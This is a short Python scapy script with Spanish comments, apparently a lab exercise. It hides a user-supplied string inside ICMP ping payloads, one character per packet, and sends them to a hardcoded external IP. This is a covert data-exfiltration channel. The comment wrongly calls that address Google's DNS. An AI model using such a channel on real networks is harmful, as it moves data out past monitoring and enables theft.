from scapy.all import IP, ICMP, send, sr1
import sys
import time

def send_ping_with_hidden_data(destination, data):
    print(f"Enviando datos ocultos a {destination}:")
    
    sequence = 0
    for char in data:
        # Creamos un paquete ICMP con el carácter en el campo de datos y secuencia incremental
        packet = IP(dst=destination)/ICMP(seq=sequence, id=0x0000)/char
        
        # Enviamos el paquete y esperamos la respuesta
        reply = sr1(packet, timeout=2, verbose=False)
        
        if reply:
            print(f"Carácter '{char}' enviado exitosamente. Secuencia: {sequence}")
        else:
            print(f"No se recibió respuesta para el carácter '{char}'. Secuencia: {sequence}")
        
        # Incrementamos la secuencia
        sequence += 1
        
        # Esperamos un poco para no saturar la red
        time.sleep(0.5)

if len(sys.argv) != 2:
    print("Uso: sudo python3 pingv4.py <texto_cifrado>")
    sys.exit(1)
texto_cifrado = sys.argv[1]
destination = "64.233.190.101"  # Usamos el DNS de Google como ejemplo
send_ping_with_hidden_data(destination, texto_cifrado)